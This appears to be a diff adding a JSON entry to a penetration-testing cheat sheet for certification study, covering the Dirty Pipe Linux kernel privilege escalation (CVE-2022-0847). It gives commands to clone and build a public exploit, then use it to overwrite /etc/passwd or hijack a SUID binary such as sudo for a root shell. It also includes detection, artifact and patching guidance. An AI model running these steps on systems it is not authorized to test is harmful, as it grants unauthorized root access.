@@ -1,0 +1,105 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "git",
+    "gcc"
+  ],
+  "tags": [
+    "dirty-pipe",
+    "cve-2022-0847",
+    "kernel"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Kernel Exploits",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "exploit-1 - rewrite /etc/passwd to set a root password",
+      "command": "# backs up /etc/passwd -> /tmp/passwd.bak, sets root pw to 'piped', restores after, drops root shell"
+    },
+    {
+      "label": "exploit-2 - hijack a SUID binary for a root shell",
+      "command": "# hijacks the given SUID binary, drops SUID shell /tmp/sh, restores binary, pops root; cleanup: rm /tmp/sh"
+    }
+  ],
+  "notes": "Affected kernels: 5.8 through 5.17 (inclusive).",
+  "references": [
+    {
+      "title": "Dirty Pipe writeup",
+      "url": "https://dirtypipe.cm4all.com/"
+    },
+    {
+      "title": "CVE-2022-0847 exploits (AlexisAhmed)",
+      "url": "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ref-linux-lpe-cves",
+      "note": "Confirm the kernel is in the 5.8-5.17 window.",
+      "rel": "prereq"
+    },
+    {
+      "id": "kernel-exploit-generic",
+      "note": "Generic kernel-exploit workflow.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "dirty-pipe",
+  "name": "Dirty Pipe (CVE-2022-0847)",
+  "command": "./exploit-1",
+  "description": "Dirty Pipe lets an unprivileged user overwrite read-only files (page cache) on kernels 5.8-5.17. exploit-1 rewrites /etc/passwd to set a root password; exploit-2 hijacks a chosen SUID binary to pop a root shell.",
+  "steps": [
+    {
+      "label": "1. Check kernel + build",
+      "command": "uname -r   # 5.8 - 5.17 = vulnerable\ngit clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git && cd CVE-2022-0847-DirtyPipe-Exploits && bash compile.sh"
+    },
+    {
+      "label": "2a. exploit-1 (modify /etc/passwd)",
+      "command": "./exploit-1"
+    },
+    {
+      "label": "2b. exploit-2 (hijack a SUID binary)",
+      "command": "find / -perm -4000 2>/dev/null\n./exploit-2 /usr/bin/sudo\nrm /tmp/sh   # cleanup"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1068"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Dirty Pipe (CVE-2022-0847) exploits a flaw in the Linux pipe subsystem: a pipe buffer flag (PIPE_BUF_FLAG_CAN_MERGE) can be set on a page cache entry of a read-only file via splice(), allowing writes to pages backed by read-only files. This enables overwriting the content of arbitrary read-only files -- including SUID binaries or /etc/passwd -- without write permission.",
+    "prerequisites": "Linux kernel 5.8 through 5.17 (inclusive). Local user account on the target. Ability to execute compiled C code.",
+    "impact": "Local privilege escalation to root. Exploit-1 modifies /etc/passwd to set root password to 'piped'. Exploit-2 hijacks any SUID binary to drop a root shell.",
+    "detection": "Kernel exploit execution generates unusual pipe + splice() syscall patterns. EDR: process writing to read-only file via pipe (anomalous write to /etc/passwd, SUID binary). Auditd: write on /etc/passwd or SUID binaries by non-root. Kernel version check in security monitoring.",
+    "artifacts": "Auditd: write to /etc/passwd or SUID binary by non-root user | EDR: unusual splice/pipe syscall sequence | /tmp/passwd.bak or /tmp/sh created by exploit",
+    "prevention": "Patch kernel to 5.16.11+, 5.15.25+, or 5.10.102+. Apply vendor security updates immediately. Use security-hardened kernels (grsecurity, KSPP). Deploy EDR with kernel exploit detection (unusual file writes to read-only files).",
+    "misconfiguration": "System running Linux kernel 5.8-5.17 without the Dirty Pipe patch applied. Kernel auto-update is disabled or delayed.",
+    "vulnerable_config": "# Vulnerable kernel version\nuname -r\n# Output: 5.13.0-xx  <- affected range 5.8-5.17\n\n# No automatic kernel patching configured",
+    "secure_config": "# Update kernel (Ubuntu/Debian)\napt update && apt upgrade linux-image-generic\n\n# Verify patched version\nuname -r  # should be >= 5.16.11 / 5.15.25 / 5.10.102\n\n# Enable automatic security updates\napt install unattended-upgrades\ndpkg-reconfigure unattended-upgrades",
+    "sources": [
+      "HTB M25",
+      "MITRE T1068",
+      "OWASP A06:2021"
+    ]
+  }
+}
